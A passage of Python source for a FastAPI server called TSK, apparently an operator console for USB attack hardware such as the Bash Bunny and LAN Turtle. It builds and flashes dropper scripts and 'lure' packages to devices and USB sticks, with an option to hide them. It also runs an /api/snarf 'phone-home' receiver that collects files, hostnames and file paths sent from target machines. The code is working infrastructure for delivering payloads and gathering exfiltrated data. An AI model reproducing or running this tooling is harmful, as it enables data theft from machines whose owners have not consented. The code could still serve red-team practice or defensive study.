#!/usr/bin/env python3
"""
TSK Web Server — FastAPI backend
Serves the web UI and exposes all TSK functionality via REST + WebSocket.
"""

import asyncio
import json
import os
import secrets
import shutil
import sys
import subprocess
import threading
import webbrowser
from pathlib import Path
from typing import Optional

from fastapi import Depends, FastAPI, HTTPException, WebSocket, WebSocketDisconnect, Request, UploadFile, File, Form
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
import uvicorn

# ── TSK modules ───────────────────────────────────────────────────────────────
sys.path.insert(0, str(Path(__file__).parent))
import config as cfg_mod
import repos as repo_mod
import flash as flash_mod
from db import resolve_builtin_db, PAYLOAD_TEMPLATES, DEFAULT_EXTENSIONS
from paths import safe_path, user_payload_dir, is_user_payload_path
from network import detect_lan_ip
from deployments import append_deployment, list_deployments
from ssh_terminal import handle_turtle_ssh, turtle_target_label
from dropper.snarfsnarf import get_options as snarf_options, build_script as snarf_build, save_script as snarf_save_script
from dropper.lure_builder import (
    get_options as lure_options,
    build_lure as lure_build,
    save_lure as lure_save,
    get_lure_package_files,
    index_user_lures,
)
from dropper.receiver import (
    save_snarf_file,
    list_catches,
    snarf_safe_path,
    recent_log_lines,
    preview_catch_file,
    delete_catch_file,
    delete_catch_session,
    export_catch_zip,
    migrate_legacy_catches,
    SHARED_USER as SNARF_SHARED_USER,
)

try:
    from devices import poll_devices, validate_bunny_mount
    DEVICE_DETECTION = True
except ImportError:
    DEVICE_DETECTION = False
    def validate_bunny_mount(path): return False

# ── App ───────────────────────────────────────────────────────────────────────
app = FastAPI(title="TSK", version="2.0.0")

WEB_DIR = Path(__file__).parent / "web"
STATIC_DIR = WEB_DIR / "static"
BRANDING_ASSETS = {
    "avatar": ("tsk-avatar-ui.png", "tsk-avatar.png"),
    "header": ("TSK-Header.png",),
}

# Active WebSocket connections for live updates
_ws_clients: list[WebSocket] = []
_main_loop: Optional[asyncio.AbstractEventLoop] = None
_last_usb_ws_sig: Optional[tuple] = None

# Session tokens: token -> username
_tokens: dict[str, str] = {}

# Catch routing tokens: catch_token -> username (rebuilt from user configs)
_catch_tokens: dict[str, str] = {}


def _rebuild_catch_token_map() -> None:
    """Rebuild the catch_token -> username lookup from all operator configs."""
    _catch_tokens.clear()
    for uname in cfg_mod.list_users():
        token = (cfg_mod.load(uname).get("catch_token") or "").strip()
        if token:
            _catch_tokens[token] = uname


def _resolve_catch_token(ct: str) -> str:
    """Resolve a catch_token to a username; returns SHARED_USER if unknown."""
    if not ct:
        return SNARF_SHARED_USER
    return _catch_tokens.get(ct.strip(), SNARF_SHARED_USER)


def _issue_token(username: str) -> str:
    """Generate and store a new session token for a user."""
    token = secrets.token_hex(32)
    _tokens[token] = username
    return token


async def require_auth(request: Request) -> str:
    """FastAPI dependency — validates X-TSK-Token header and returns the username."""
    token = request.headers.get("X-TSK-Token", "").strip()
    username = _tokens.get(token, "")
    if not username:
        raise HTTPException(status_code=401, detail="Not authenticated")
    return username

# ─────────────────────────────────────────────────────────────────────────────
#  WebSocket broadcast
# ─────────────────────────────────────────────────────────────────────────────

async def broadcast(msg: dict) -> None:
    dead = []
    for ws in _ws_clients:
        try:
            await ws.send_json(msg)
        except Exception:
            dead.append(ws)
    for ws in dead:
        _ws_clients.remove(ws)

def broadcast_sync(msg: dict) -> None:
    """Thread-safe broadcast from sync code (flash/repo worker threads)."""
    loop = _main_loop
    if loop is None or not loop.is_running():
        print(f"[TSK] broadcast_sync skipped (no loop): {msg.get('type')}", flush=True)
        return
    try:
        future = asyncio.run_coroutine_threadsafe(broadcast(msg), loop)
        if msg.get("type") in ("flash_done", "repo_done"):
            future.result(timeout=10)
    except Exception as e:
        print(f"[TSK] broadcast_sync failed ({msg.get('type')}): {e}", flush=True)

# ─────────────────────────────────────────────────────────────────────────────
#  Routes — UI
# ─────────────────────────────────────────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
async def index():
    html = (WEB_DIR / "index.html").read_text()
    return HTMLResponse(html)


@app.get("/tutorial", response_class=HTMLResponse)
async def tutorial():
    html = (WEB_DIR / "tutorial.html").read_text()
    return HTMLResponse(html)


@app.get("/api/branding/{asset_name}")
async def branding_asset(asset_name: str):
    """Serve ABOUT / favicon brand images via API (reliable even if static mount misconfigured)."""
    key = asset_name.lower().replace(".png", "").replace(".jpg", "")
    pair = BRANDING_ASSETS.get(key)
    if not pair:
        return JSONResponse({"error": "not found"}, status_code=404)
    for filename in pair:
        path = STATIC_DIR / filename
        if path.is_file():
            return FileResponse(path, media_type="image/png")
    return JSONResponse({"error": "file missing on server"}, status_code=404)

# ─────────────────────────────────────────────────────────────────────────────
#  Routes — Config
# ─────────────────────────────────────────────────────────────────────────────

@app.get("/api/config")
async def get_config(username: str = Depends(require_auth)):
    import platform
    cfg = cfg_mod.load(username)
    cfg["_user"] = username
    cfg["_host"] = platform.node()
    print(f"[TSK] get_config user={username!r} lhost={cfg.get('lhost')!r}")
    return cfg_mod.public_config(cfg)

@app.post("/api/config")
async def set_config(data: dict, username: str = Depends(require_auth)):
    import platform
    data.pop("_username", None)  # ignore any client-supplied username
    cfg = cfg_mod.load(username)
    updates = {k: v for k, v in data.items() if not k.startswith("_")}
    cfg.update(updates)
    cfg_mod.save(cfg, username)
    print(f"[TSK] set_config user={username!r} → {cfg_mod.redact_for_log(updates)}")
    saved = cfg_mod.load(username)
    saved["_user"] = username
    saved["_host"] = platform.node()
    return {
        "ok": True,
        "config": cfg_mod.public_config(saved),
        "user": username,
        "updates": cfg_mod.redact_for_log(updates),
    }

# ── Auth routes ───────────────────────────────────────────────────────────────

@app.get("/api/auth/users")
async def get_users():
    """List available usernames for login dropdown."""
    return {"users": cfg_mod.list_users()}

@app.post("/api/auth/login")
async def login(data: dict):
    username = data.get("username","").strip()
    password = data.get("password","")
    if not username:
        return JSONResponse({"error": "Username required"}, status_code=400)
    user = cfg_mod.authenticate(username, password)
    if not user:
        return JSONResponse({"error": "Invalid username or password"}, status_code=401)
    cfg_mod.set_session(username, user)
    token = _issue_token(username)
    cfg_mod.get_or_create_catch_token(username)  # ensure catch token exists
    _rebuild_catch_token_map()
    cfg = cfg_mod.load(username)
    import platform
    cfg["_user"]  = username
    cfg["_host"]  = platform.node()
    print(f"[TSK] login: {username} lhost={cfg.get('lhost')!r} lport={cfg.get('lport')!r}")
    return {"ok": True, "username": username, "token": token, "config": cfg_mod.public_config(cfg)}

@app.post("/api/auth/register")
async def register(request: Request, data: dict):
    username = data.get("username","").strip()
    password = data.get("password","")
    if not username or not password:
        return JSONResponse({"error": "Username and password required"}, status_code=400)
    if len(password) < 8:
        return JSONResponse({"error": "Password must be at least 8 characters"}, status_code=400)
    existing = cfg_mod.list_users()
    if existing:
        # After first operator exists, only authenticated operators can add more
        token = request.headers.get("X-TSK-Token", "").strip()
        if not token or _tokens.get(token, "") == "":
            return JSONResponse({"error": "Authentication required to add operators"}, status_code=401)
    try:
        user = cfg_mod.create_user(username, password)
        cfg_mod.set_session(username, user)
        token = _issue_token(username)
        cfg_mod.get_or_create_catch_token(username)
        _rebuild_catch_token_map()
        cfg = cfg_mod.load(username)
        import platform
        cfg["_user"] = username
        cfg["_host"] = platform.node()
        return {"ok": True, "username": username, "token": token, "config": cfg_mod.public_config(cfg)}
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=409)

@app.post("/api/auth/change-password")
async def change_password_route(request: Request, data: dict):
    """Change password. Works from login screen (current password) or while logged in."""
    username = data.get("username", "").strip()
    current = data.get("current_password", "")
    new_pw = data.get("new_password", "")
    if not username or not current or not new_pw:
        return JSONResponse({"error": "Username, current password, and new password required"}, status_code=400)
    token = request.headers.get("X-TSK-Token", "").strip()
    auth_user = _tokens.get(token, "")
    if auth_user and auth_user != username:
        return JSONResponse({"error": "Cannot change another operator's password"}, status_code=403)
    try:
        cfg_mod.change_password(username, current, new_pw)
        return {"ok": True}
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)


@app.post("/api/auth/rename")
async def rename_operator(data: dict, auth_user: str = Depends(require_auth)):
    new_username = data.get("new_username", "").strip()
    password = data.get("password", "")
    if not new_username or not password:
        return JSONResponse({"error": "New operator name and current password required"}, status_code=400)
    try:
        cfg_mod.rename_user(auth_user, new_username, password)
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)
    for t, u in list(_tokens.items()):
        if u == auth_user:
            del _tokens[t]
    token = _issue_token(new_username)
    cfg_mod.set_session(new_username, cfg_mod.load_users().get(new_username))
    _rebuild_catch_token_map()
    cfg = cfg_mod.load(new_username)
    import platform
    cfg["_user"] = new_username
    cfg["_host"] = platform.node()
    print(f"[TSK] operator renamed: {auth_user} -> {new_username}")
    return {
        "ok": True,
        "username": new_username,
        "token": token,
        "config": cfg_mod.public_config(cfg),
    }

@app.delete("/api/auth/operator")
async def delete_operator(data: dict, auth_user: str = Depends(require_auth)):
    username = data.get("username", "").strip()
    password = data.get("password", "")
    if not username or not password:
        return JSONResponse({"error": "Username and password required"}, status_code=400)
    if username != auth_user:
        return JSONResponse({"error": "Cannot delete another operator's account"}, status_code=403)
    user = cfg_mod.authenticate(username, password)
    if not user:
        return JSONResponse({"error": "Invalid username or password"}, status_code=401)
    if not cfg_mod.delete_user(username):
        return JSONResponse({"error": "Operator not found"}, status_code=400)
    user_dir = cfg_mod.USERS_DIR / username
    if user_dir.is_dir():
        shutil.rmtree(user_dir)
    # Invalidate all tokens for deleted user
    to_remove = [t for t, u in _tokens.items() if u == username]
    for t in to_remove:
        del _tokens[t]
    return {"ok": True}

@app.post("/api/auth/logout")
async def logout(request: Request):
    token = request.headers.get("X-TSK-Token", "").strip()
    if token and token in _tokens:
        del _tokens[token]
    cfg_mod.set_session("default", None)
    return {"ok": True}

@app.get("/api/auth/status")
async def auth_status(request: Request):
    import platform
    token = request.headers.get("X-TSK-Token", "").strip()
    username = _tokens.get(token, "")
    return {
        "username": username or "default",
        "logged_in": bool(username),
        "host": platform.node(),
    }

# ─────────────────────────────────────────────────────────────────────────────
#  Routes — Devices
# ─────────────────────────────────────────────────────────────────────────────

@app.get("/api/devices")
async def get_devices(username: str = Depends(require_auth)):
    if not DEVICE_DETECTION:
        return {"ducky": False, "bunny": False, "turtle": False, "teensy": False}
    try:
        statuses = poll_devices()
        return {
            k: {
                "connected": s.connected,
                "name": s.name,
                "mount_path": s.mount_path,
            }
            for k, s in statuses.items()
        }
    except Exception as e:
        return {"error": str(e)}


@app.get("/api/devices/bunny/validate-mount")
async def validate_bunny_mount_route(path: str = "", username: str = Depends(require_auth)):
    """Check whether a path is a valid Bash Bunny arming-mode mount (payloads/ + loot/ present)."""
    if not path:
        return {"valid": False, "reason": "No path provided"}
    valid = validate_bunny_mount(path)
    return {"valid": valid, "reason": "OK" if valid else "Path does not contain payloads/ and loot/ directories"}

@app.get("/api/usb/mounts")
async def get_usb_mounts(force: bool = False, username: str = Depends(require_auth)):
    """Plain USB stick volumes available for dropper flash."""
    cfg = cfg_mod.load(username)
    mounts = flash_mod.list_usb_mounts(cfg, force=force)
    return {
        "mounts": mounts,
        "configured": (cfg.get("usb_mount") or "").strip(),
    }

# ─────────────────────────────────────────────────────────────────────────────
#  Routes — Payloads
# ─────────────────────────────────────────────────────────────────────────────

def _get_payload_db(device: str, username: str = "") -> list:
    """Get payloads — real repo if cloned, otherwise builtin; merge user saves."""
    user = username.strip() or cfg_mod.current_user()
    rp = cfg_mod.REPOS_DIR / device
    if rp.exists():
        payloads = repo_mod.index_payloads(device)
        if payloads:
            cats = {}
            for p in payloads:
                cats.setdefault(p["cat"], []).append(p)
            db = [{"cat": cat, "payloads": items}
                  for cat, items in sorted(cats.items())]
        else:
            db = resolve_builtin_db(device)
    else:
        db = resolve_builtin_db(device)

    user_saved = repo_mod.index_user_payloads(device, user)
    if user_saved:
        by_cat: dict[str, list] = {}
        for p in user_saved:
            by_cat.setdefault(p["cat"], []).append(p)
        for cat, items in by_cat.items():
            existing = next((g for g in db if g["cat"] == cat), None)
            if existing:
                existing["payloads"].extend(items)
            else:
                db = list(db) + [{"cat": cat, "payloads": items}]
    if device == "usb":
        user_lures = index_user_lures(user)
        if user_lures:
            lure_cat = next((g for g in db if g["cat"] == "LURES"), None)
            if lure_cat:
                lure_cat["payloads"].extend(user_lures)
            else:
                db = list(db) + [{"cat": "LURES", "payloads": user_lures}]
    return db

@app.get("/api/payloads/{device}")
async def get_payloads(device: str, username: str = Depends(require_auth)):
    rp = cfg_mod.REPOS_DIR / device
    repo_exists = rp.exists()
    db = _get_payload_db(device, username)
    total = sum(len(g["payloads"]) for g in db)
    print(f"[TSK] /api/payloads/{device} user={username!r} → repo={rp} exists={repo_exists} payloads={total}")
    return {
        "device": device,
        "source": "repo" if repo_exists else "builtin",
        "repo_exists": repo_exists,
        "repo_path": str(rp),
        "repo_url": repo_mod.REPO_URLS.get(device, ""),
        "total": total,
        "groups": db,
    }

async def _read_file(path: str, username: str):
    """Shared file reader — paths confined to repo/user directories."""
    if not path:
        return JSONResponse({"content": "", "error": "No path"}, status_code=400)
    try:
        resolved = safe_path(path, username=username)
    except ValueError as e:
        return JSONResponse({"content": "", "error": str(e)}, status_code=403)
    try:
        with open(resolved, "r", errors="ignore") as f:
            content = f.read(16000)
        return {"content": content, "path": str(resolved), "size": len(content)}
    except Exception as e:
        return JSONResponse({"content": "", "error": str(e)}, status_code=500)

@app.get("/api/payload/preview")
async def preview_get(path: str = "", username: str = Depends(require_auth)):
    return await _read_file(path, username)

@app.post("/api/payload/preview")
async def preview_post(data: dict, username: str = Depends(require_auth)):
    return await _read_file(data.get("path", ""), username)

@app.get("/api/payload/read")
async def read_get(path: str = "", username: str = Depends(require_auth)):
    return await _read_file(path, username)

@app.post("/api/payload/read")
async def read_post(data: dict, username: str = Depends(require_auth)):
    return await _read_file(data.get("path", ""), username)

@app.get("/api/payload/search")
async def search_payloads(device: str, q: str, username: str = Depends(require_auth)):
    db = _get_payload_db(device, username)
    q_lower = q.lower()
    results = []
    for group in db:
        for p in group["payloads"]:
            if (q_lower in p["name"].lower() or
                q_lower in p.get("desc","").lower() or
                any(q_lower in t.lower() for t in p.get("tags",[]))):
                results.append({**p, "cat": group["cat"]})
    return {"results": results, "count": len(results)}

# ─────────────────────────────────────────────────────────────────────────────
#  Routes — Repos
# ─────────────────────────────────────────────────────────────────────────────

@app.get("/api/repos")
async def get_repos(username: str = Depends(require_auth)):
    return {
        device: repo_mod.repo_status(device)
        for device in repo_mod.REPO_URLS
    }

@app.post("/api/repos/clone")
async def clone_repo(data: dict, username: str = Depends(require_auth)):
    device = data.get("device", "")
    if device == "all":
        devices = list(repo_mod.REPO_URLS.keys())
    elif device in repo_mod.REPO_URLS:
        devices = [device]
    else:
        return JSONResponse({"error": f"Unknown device: {device}"}, status_code=400)

    async def run_clone():
        import shutil as _sh
        for dev in devices:
            url  = repo_mod.REPO_URLS.get(dev, "")
            dest = repo_mod.repo_path(dev)

            await broadcast({"type": "terminal", "line": f"── {dev.upper()} ──────────────────────────────", "cls": "cmd"})
            await broadcast({"type": "terminal", "line": f"$ git clone --depth=1 {url}", "cls": "cmd"})
            await broadcast({"type": "terminal", "line": f"  dest: {dest}", "cls": ""})

            if dest.exists():
                await broadcast({"type": "terminal", "line": "  Removing existing repo...", "cls": ""})
                try:
                    _sh.rmtree(str(dest))
                    await broadcast({"type": "terminal", "line": "  ✓ Removed", "cls": "ok"})
                except Exception as e:
                    await broadcast({"type": "terminal", "line": f"  ✗ {e}", "cls": "err"})
                    continue

            dest.parent.mkdir(parents=True, exist_ok=True)

            try:
                proc = await asyncio.create_subprocess_exec(
                    "git", "clone", "--depth=1", "--progress", url, str(dest),
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT,
                )

                buf = b""
                last_sent = ""
                while True:
                    ch = await proc.stdout.read(1)
                    if not ch:
                        break
                    if ch in (b"\n", b"\r"):
                        line = buf.decode(errors="ignore").strip()
                        buf = b""
                        if line and line != last_sent:
                            last_sent = line
                            low = line.lower()
                            if any(w in low for w in ["receiving","resolving","compressing","counting","updating"]):
                                cls = "progress"
                            elif any(w in low for w in ["done","✓","cloned"]):
                                cls = "ok"
                            elif any(w in low for w in ["error","fatal"]):
                                cls = "err"
                            else:
                                cls = ""
                            await broadcast({"type": "terminal", "line": f"  {line}", "cls": cls})
                    else:
                        buf += ch

                await proc.wait()
                if proc.returncode == 0:
                    await broadcast({"type": "terminal", "line": "  ✓ Clone complete!", "cls": "ok"})
                else:
                    await broadcast({"type": "terminal", "line": f"  ✗ Clone failed (exit {proc.returncode})", "cls": "err"})

            except Exception as e:
                await broadcast({"type": "terminal", "line": f"  ✗ Error: {e}", "cls": "err"})

            st = repo_mod.repo_status(dev)
            await broadcast({"type": "repo_done", "device": dev, "status": st})
            await broadcast({"type": "terminal", "line": f"  → {st.get('payload_count',0)} payloads indexed", "cls": "ok"})
            await broadcast({"type": "terminal", "line": "", "cls": ""})

    asyncio.create_task(run_clone())
    return {"ok": True, "cloning": devices}

@app.post("/api/repos/update")
async def update_repos(username: str = Depends(require_auth)):
    async def run_update():
        for dev in repo_mod.REPO_URLS:
            if repo_mod.repo_path(dev).exists():
                await broadcast({"type": "terminal", "line": f"$ git pull [{dev}]", "cls": "cmd"})
                proc = await asyncio.create_subprocess_exec(
                    "git", "pull", "--progress",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.STDOUT,
                    cwd=str(repo_mod.repo_path(dev))
                )
                buf = b""
                last_sent = ""
                while True:
                    ch = await proc.stdout.read(1)
                    if not ch:
                        break
                    if ch in (b"\n", b"\r"):
                        line = buf.decode(errors="ignore").strip()
                        buf = b""
                        if line and line != last_sent:
                            last_sent = line
                            low = line.lower()
                            cls = "ok" if any(w in low for w in ["done","up to date","fast-forward","already"]) else ""
                            await broadcast({"type": "terminal", "line": f"  {line}", "cls": cls})
                    else:
                        buf += ch
                await proc.wait()
                st = repo_mod.repo_status(dev)
                await broadcast({"type": "repo_done", "device": dev, "status": st})
                await broadcast({"type": "terminal", "line": f"  → {dev} · {st.get('payload_count',0)} payloads", "cls": "ok"})
                await broadcast({"type": "terminal", "line": "", "cls": ""})

    asyncio.create_task(run_update())
    return {"ok": True}

# ─────────────────────────────────────────────────────────────────────────────
#  Routes — Flash
# ─────────────────────────────────────────────────────────────────────────────

@app.post("/api/flash")
async def flash(data: dict, username: str = Depends(require_auth)):
    device  = data.get("device", "")
    payload = data.get("payload", {})
    extra   = data.get("extra", {})

    if not payload.get("path"):
        return JSONResponse(
            {"error": "No file path - clone the repo first."}, status_code=400
        )

    try:
        safe_path(payload["path"], username=username)
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=403)

    # Validate usb_mount_path against live mounts (prevents arbitrary path flash)
    if device == "usb" and extra.get("usb_mount_path"):
        cfg_check = cfg_mod.load(username)
        live_mounts = flash_mod.list_usb_mounts(cfg_check)
        live_paths = {m["path"] for m in live_mounts}
        if extra["usb_mount_path"] not in live_paths:
            return JSONResponse({"error": "USB mount path not in detected mounts"}, status_code=400)

    user = username
    def run():
        cfg = cfg_mod.load(user)
        broadcast_sync({"type": "flash_start", "device": device,
                        "payload": payload["name"]})
        def cb(msg):
            broadcast_sync({"type": "flash_progress", "msg": msg})
        try:
            ok = flash_mod.flash_device(
                device, payload, cb, extra=extra, cfg=cfg,
            )
        except Exception as e:
            broadcast_sync({"type": "flash_progress", "msg": f"✗ Flash error: {e}"})
            ok = False
        if ok:
            deploy_path = ""
            if device == "usb":
                mount = extra.get("usb_mount_path") or cfg.get("usb_mount") or ""
                deploy = (extra.get("usb_deploy") or "root").strip().lower()
                sub = ".tsk/" if deploy == "hidden" else ""
                deploy_path = f"{mount}/{sub}{payload.get('file', payload.get('name', ''))}"
            append_deployment(user, {
                "device": device,
                "payload": payload.get("name", ""),
                "file": payload.get("file", ""),
                "path": payload.get("path", ""),
                "deploy_path": deploy_path,
                "ok": True,
            })
        broadcast_sync({"type": "flash_done", "ok": ok, "payload": payload.get("name", "")})

    threading.Thread(target=run, daemon=True).start()
    return {"ok": True, "status": "flashing"}

@app.post("/api/flash/preview")
async def flash_preview_route(data: dict, username: str = Depends(require_auth)):
    path = data.get("path", "")
    if not path:
        return JSONResponse({"error": "path required"}, status_code=400)
    try:
        safe_path(path, username=username)
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=403)
    cfg = cfg_mod.load(username)
    try:
        preview = flash_mod.flash_preview(
            path,
            cfg,
            device=data.get("device", ""),
            usb_deploy=data.get("usb_deploy", "root"),
            usb_mount_path=data.get("usb_mount_path", ""),
        )
        return preview
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)

@app.get("/api/deployments")
async def get_deployments(limit: int = 30, username: str = Depends(require_auth)):
    limit = max(1, min(limit, 100))
    return {"entries": list_deployments(username, limit=limit)}

@app.get("/api/deployments/export")
async def export_deployments_csv(username: str = Depends(require_auth)):
    import csv, io
    from fastapi.responses import StreamingResponse
    entries = list_deployments(username, limit=100)
    fields = ["time", "device", "payload", "file", "path", "deploy_path", "ok"]
    buf = io.StringIO()
    writer = csv.DictWriter(buf, fieldnames=fields, extrasaction="ignore",
                            lineterminator="\n")
    writer.writeheader()
    for e in entries:
        writer.writerow({f: e.get(f, "") for f in fields})
    buf.seek(0)
    filename = f"tsk_deployments_{username}.csv"
    return StreamingResponse(
        iter([buf.getvalue()]),
        media_type="text/csv",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )

@app.get("/api/network/lan-ip")
async def get_lan_ip():
    cfg = cfg_mod.load(cfg_mod.current_user())  # public info, no auth needed
    ip = detect_lan_ip()
    return {
        "ip": ip or "",
        "port": (cfg.get("lport") or "").strip() or "1337",
        "phone_home_url": f"http://{ip}:{cfg.get('lport', '1337')}/api/snarf" if ip else "",
    }

# ─────────────────────────────────────────────────────────────────────────────
#  WebSocket — live updates
# ─────────────────────────────────────────────────────────────────────────────

@app.get("/api/test-terminal")
async def test_terminal(username: str = Depends(require_auth)):
    """Send test messages to terminal to verify WS pipeline works."""
    import asyncio
    async def send():
        for i in range(5):
            await broadcast({"type": "terminal", "line": f"  TEST LINE {i+1} — WebSocket is working!", "cls": "ok" if i%2==0 else "progress"})
            await asyncio.sleep(0.3)
        await broadcast({"type": "terminal", "line": "  ✓ WebSocket pipeline verified", "cls": "ok"})
    asyncio.create_task(send())
    return {"ok": True}


@app.websocket("/ws")
async def websocket_endpoint(ws: WebSocket, token: str = ""):
    await ws.accept()
    username = _tokens.get(token, "")
    if not username:
        await ws.close(code=4001)
        return
    _ws_clients.append(ws)
    # Send initial state scoped to the authenticated user
    cfg = cfg_mod.public_config(cfg_mod.load(username))
    await ws.send_json({"type": "config", "data": cfg})
    try:
        cfg_user = cfg_mod.load(username)
        initial_mounts = flash_mod.list_usb_mounts(cfg_user, force=True)
        await ws.send_json({"type": "usb_sticks", "data": initial_mounts})
        global _last_usb_ws_sig
        _last_usb_ws_sig = flash_mod.usb_mounts_signature(initial_mounts)
        tick = 0
        while True:
            await asyncio.sleep(2)
            tick += 1
            if DEVICE_DETECTION and tick % 2 == 0:
                try:
                    statuses = poll_devices()
                    await ws.send_json({
                        "type": "devices",
                        "data": {
                            k: {"connected": s.connected, "name": s.name, "mount_path": s.mount_path}
                            for k, s in statuses.items()
                        }
                    })
                except Exception:
                    pass
            # USB stick scan every ~10s, only broadcast when mount list changes
            if tick % 5 == 0:
                try:
                    cfg = cfg_mod.load(username)
                    mounts = flash_mod.list_usb_mounts(cfg)
                    sig = flash_mod.usb_mounts_signature(mounts)
                    if sig != _last_usb_ws_sig:
                        _last_usb_ws_sig = sig
                        await ws.send_json({"type": "usb_sticks", "data": mounts})
                except Exception:
                    pass
    except WebSocketDisconnect:
        if ws in _ws_clients:
            _ws_clients.remove(ws)


@app.get("/api/ssh/turtle/info")
async def turtle_ssh_info(username: str = Depends(require_auth)):
    """Return configured LAN Turtle SSH target for the UI."""
    cfg = cfg_mod.load(username)
    return {
        "target": turtle_target_label(cfg),
        "ip": cfg.get("turtle_ip", "172.16.84.1"),
        "user": cfg.get("turtle_user", "root"),
        "port": cfg.get("turtle_port", "22"),
    }


@app.websocket("/ws/ssh/turtle")
async def websocket_ssh_turtle(ws: WebSocket, token: str = ""):
    """Interactive SSH session to LAN Turtle (browser terminal)."""
    await ws.accept()
    username = _tokens.get(token, "")
    if not username:
        await ws.close(code=4001)
        return
    cfg = cfg_mod.load(username)
    try:
        await handle_turtle_ssh(ws, cfg)
    except WebSocketDisconnect:
        pass
    except Exception as e:
        try:
            await ws.send_json({"type": "error", "msg": str(e)})
        except Exception:
            pass
    finally:
        try:
            await ws.close()
        except Exception:
            pass

# ─────────────────────────────────────────────────────────────────────────────
#  Routes — USB Dropper / SnarfSnarf
# ─────────────────────────────────────────────────────────────────────────────

@app.get("/api/dropper/snarfsnarf/options")
async def dropper_snarf_options(username: str = Depends(require_auth)):
    return snarf_options()


@app.post("/api/dropper/snarfsnarf/build")
async def dropper_snarf_build(data: dict, username: str = Depends(require_auth)):
    cfg = cfg_mod.load(username)
    try:
        result = snarf_build(data, cfg)
        return {"ok": True, **result}
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)
    except RuntimeError as e:
        return JSONResponse({"error": str(e)}, status_code=500)
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


@app.post("/api/dropper/snarfsnarf/save")
async def dropper_snarf_save(data: dict, username: str = Depends(require_auth)):
    filename = data.get("filename", "")
    content = data.get("content", "")
    if not filename or not content:
        return JSONResponse({"error": "filename and content required"}, status_code=400)
    try:
        path = snarf_save_script(username, filename, content)
        return {"ok": True, "path": str(path), "filename": filename}
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/dropper/lure/options")
async def dropper_lure_options(username: str = Depends(require_auth)):
    return lure_options(username)


@app.post("/api/dropper/lure/build")
async def dropper_lure_build(data: dict, username: str = Depends(require_auth)):
    cfg = cfg_mod.load(username)
    try:
        result = lure_build(data, cfg, username)
        return {"ok": True, **result}
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)
    except RuntimeError as e:
        return JSONResponse({"error": str(e)}, status_code=500)
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


@app.post("/api/dropper/lure/save")
async def dropper_lure_save(data: dict, username: str = Depends(require_auth)):
    artifacts = data.get("artifacts") or []
    package_files = data.get("package_files") or None
    if not artifacts:
        return JSONResponse({"error": "artifacts required"}, status_code=400)
    try:
        paths = lure_save(username, artifacts, package_files=package_files)
        return {
            "ok": True,
            "paths": [str(p) for p in paths],
            "filenames": [p.name for p in paths],
        }
    except ValueError as e:
        return JSONResponse({"error": str(e)}, status_code=400)
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)


@app.get("/api/dropper/lure/package-files")
async def dropper_lure_package_files(lure: str = "", username: str = Depends(require_auth)):
    if not lure:
        return JSONResponse({"error": "lure filename required"}, status_code=400)
    files = get_lure_package_files(username, lure)
    return {"ok": True, "filenames": files}


@app.post("/api/dropper/lure/flash")
async def dropper_lure_flash(data: dict, username: str = Depends(require_auth)):
    filenames = data.get("filenames") or []
    extra = {
        "usb_deploy": data.get("usb_deploy", "root"),
        "usb_mount_path": data.get("usb_mount_path", ""),
    }

    # Validate mount path against live mounts
    if extra.get("usb_mount_path"):
        cfg_check = cfg_mod.load(username)
        live_paths = {m["path"] for m in flash_mod.list_usb_mounts(cfg_check)}
        if extra["usb_mount_path"] not in live_paths:
            return JSONResponse({"error": "USB mount path not in detected mounts"}, status_code=400)

    user = username
    def run():
        cfg = cfg_mod.load(user)
        broadcast_sync({"type": "flash_start", "device": "usb", "payload": "lure package"})
        def cb(msg):
            broadcast_sync({"type": "flash_progress", "msg": msg})
        try:
            ok = flash_mod.flash_lure_package(
                filenames,
                user,
                cb,
                cfg=cfg,
                deploy=extra.get("usb_deploy", "root"),
                mount_path=extra.get("usb_mount_path", ""),
            )
        except Exception as e:
            broadcast_sync({"type": "flash_progress", "msg": f"✗ Lure flash error: {e}"})
            ok = False
        if ok:
            append_deployment(user, {
                "device": "usb",
                "payload": "lure package",
                "file": ", ".join(filenames[:3]),
                "path": "",
                "deploy_path": extra.get("usb_mount_path", ""),
                "ok": True,
            })
        broadcast_sync({"type": "flash_done", "ok": ok, "payload": "lure package"})

    threading.Thread(target=run, daemon=True).start()
    return {"ok": True, "status": "flashing"}


# ─────────────────────────────────────────────────────────────────────────────
#  Routes — Snarf receiver (phone-home catch)
# ─────────────────────────────────────────────────────────────────────────────

@app.post("/api/snarf")
async def snarf_receive(
    request: Request,
    ct: str = "",           # operator catch_token - routes catch to correct operator
    hostname: str = Form(""),
    source: str = Form(""),
    timestamp: str = Form(""),
    filepath: str = Form(""),
    file: Optional[UploadFile] = File(None),
):
    operator = _resolve_catch_token(ct)
    client_ip = request.client.host if request.client else ""
    content_type = (request.headers.get("content-type") or "").lower()

    try:
        if "application/json" in content_type:
            data = await request.json()
            if not isinstance(data, dict):
                return JSONResponse({"error": "JSON object required"}, status_code=400)
            # Also check JSON body for ct if not in query param
            if not ct and data.get("ct"):
                operator = _resolve_catch_token(str(data["ct"]))
            raw = data.get("content") or data.get("data") or ""
            if isinstance(raw, str):
                file_bytes = raw.encode("utf-8")
            elif isinstance(raw, (bytes, bytearray)):
                file_bytes = bytes(raw)
            else:
                file_bytes = b""
            if not file_bytes:
                return JSONResponse({"error": "content or data required"}, status_code=400)
            result = save_snarf_file(
                file_bytes,
                hostname=str(data.get("hostname") or ""),
                timestamp=str(data.get("timestamp") or ""),
                filepath=str(data.get("filepath") or ""),
